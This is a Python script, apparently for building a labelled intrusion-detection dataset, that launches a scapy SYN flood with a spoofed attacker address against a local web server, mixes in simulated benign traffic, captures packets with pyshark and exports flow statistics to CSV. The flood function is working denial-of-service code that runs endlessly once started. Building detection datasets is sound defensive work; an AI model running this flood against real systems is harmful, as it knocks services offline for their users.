import scapy.all as scapy
import threading
import time
import random
import pyshark
import pandas as pd
import numpy as np
from collections import defaultdict

# Define interface and parameters
INTERFACE = "Wi-Fi 2"
CAPTURE_DURATION = 60
OUTPUT_CSV = "captured_traffic_with_labels.csv"

# Flow statistics storage
flow_stats = defaultdict(lambda: {
    "Start Time": None, 
    "Last Packet Time": None,
    "Total Length of Fwd Packets": 0,
    "Total Backward Packets": 0,
    "Fwd Packet Lengths": [],
    "Packet Lengths": [],
    "Fwd IATs": [],
    "Bwd IATs": [],
    "Active Times": [],
    "Idle Times": [],
    "act_data_pkt_fwd": 0,
    "Subflow Fwd Bytes": 0,
    "Label": "benign"
})

start_time = None

ATTACKER_IP = "192.168.1.50"
BENIGN_USERS = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]

def syn_flood(target_ip, target_port):
    while True:
        ip = scapy.IP(src=ATTACKER_IP, dst=target_ip)
        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
        packet = ip / tcp
        scapy.send(packet, verbose=False)

def benign_traffic(target_ip, target_port, src_ip):
    while True:
        ip = scapy.IP(src=src_ip, dst=target_ip)
        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="PA")
        packet = ip / tcp / "Hello, server!"
        scapy.send(packet, verbose=False)
        time.sleep(random.uniform(0.5, 2))

# Start attacker and benign users
attacker_thread = threading.Thread(target=syn_flood, args=("192.168.1.100", 80))
benign_threads = [threading.Thread(target=benign_traffic, args=("192.168.1.100", 80, ip)) for ip in BENIGN_USERS]

attacker_thread.start()
for thread in benign_threads:
    thread.start()

# Packet processing function
def process_packet(packet):
    global start_time
    try:
        if hasattr(packet, "ip") and hasattr(packet, "transport_layer"):
            src_ip = getattr(packet.ip, "src", None)
            dst_ip = getattr(packet.ip, "dst", None)
            protocol = packet.transport_layer
            timestamp = float(packet.sniff_time.timestamp())

            if hasattr(packet[protocol], "srcport") and hasattr(packet[protocol], "dstport"):
                src_port = int(getattr(packet[protocol], "srcport", 0))
                dst_port = int(getattr(packet[protocol], "dstport", 0))
                pkt_length = int(getattr(packet, "length", 0))

                if start_time is None:
                    start_time = timestamp

                flow_key = (src_ip, src_port, dst_ip, dst_port, protocol)

                if flow_stats[flow_key]["Start Time"] is None:
                    flow_stats[flow_key]["Start Time"] = timestamp

                last_time = flow_stats[flow_key]["Last Packet Time"]
                flow_stats[flow_key]["Last Packet Time"] = timestamp

                if last_time:
                    iat = timestamp - last_time
                    if src_ip == packet.ip.src:
                        flow_stats[flow_key]["Fwd IATs"].append(iat)
                        flow_stats[flow_key]["act_data_pkt_fwd"] += 1
                    else:
                        flow_stats[flow_key]["Bwd IATs"].append(iat)

                    if iat < 1.0:
                        flow_stats[flow_key]["Active Times"].append(iat)
                    else:
                        flow_stats[flow_key]["Idle Times"].append(iat)

                flow_stats[flow_key]["Packet Lengths"].append(pkt_length)
                if src_ip == packet.ip.src:
                    flow_stats[flow_key]["Fwd Packet Lengths"].append(pkt_length)
                    flow_stats[flow_key]["Total Length of Fwd Packets"] += pkt_length
                    flow_stats[flow_key]["Subflow Fwd Bytes"] += pkt_length
                else:
                    flow_stats[flow_key]["Total Backward Packets"] += 1

                # Assign labels based on IP
                if src_ip == ATTACKER_IP:
                    flow_stats[flow_key]["Label"] = "attack"
                elif src_ip in BENIGN_USERS:
                    flow_stats[flow_key]["Label"] = "benign"
    except Exception as e:
        print(f"Error processing packet: {e}")

# Start capture
print(f"Capturing on {INTERFACE} for {CAPTURE_DURATION} seconds...")
capture = pyshark.LiveCapture(interface=INTERFACE)

start_time = time.time()
for packet in capture.sniff_continuously():
    if time.time() - start_time > CAPTURE_DURATION:
        break
    process_packet(packet)

# Compute features
data = []
for flow_key, stats in flow_stats.items():
    duration = max((stats["Last Packet Time"] - stats["Start Time"]), 1e-10)
    feature_vector = {
        "Flow Duration": duration,
        "Flow Bytes/s": stats["Total Length of Fwd Packets"] / duration,
        "Flow Packets/s": len(stats["Packet Lengths"]) / duration,
        "Total Length of Fwd Packets": stats["Total Length of Fwd Packets"],
        "Total Backward Packets": stats["Total Backward Packets"],
        "Subflow Fwd Bytes": stats["Subflow Fwd Bytes"],
        "Fwd Packet Length Min": min(stats["Fwd Packet Lengths"], default=0),
        "Fwd Packet Length Max": max(stats["Fwd Packet Lengths"], default=0),
        "Fwd Packet Length Mean": np.mean(stats["Fwd Packet Lengths"]) if stats["Fwd Packet Lengths"] else 0,
        "Packet Length Std": np.std(stats["Packet Lengths"], dtype=np.float64) if stats["Packet Lengths"] else 0,
        "Packet Length Variance": np.var(stats["Packet Lengths"], dtype=np.float64) if stats["Packet Lengths"] else 0,
        "Bwd IAT Max": max(stats["Bwd IATs"], default=0),
        "Bwd IAT Std": np.std(stats["Bwd IATs"], dtype=np.float64) if stats["Bwd IATs"] else 0,
        "Bwd IAT Total": sum(stats["Bwd IATs"]),
        "Active Max": max(stats["Active Times"], default=0),
        "Active Mean": np.mean(stats["Active Times"], dtype=np.float64) if stats["Active Times"] else 0,
        "Idle Max": max(stats["Idle Times"], default=0),
        "Idle Mean": np.mean(stats["Idle Times"], dtype=np.float64) if stats["Idle Times"] else 0,
        "act_data_pkt_fwd": stats["act_data_pkt_fwd"],
        "Label": stats["Label"]
    }
    data.append(feature_vector)

# Save to CSV
pd.DataFrame(data).to_csv(OUTPUT_CSV, index=False, float_format="%.10f")
print(f"Results saved to {OUTPUT_CSV}")

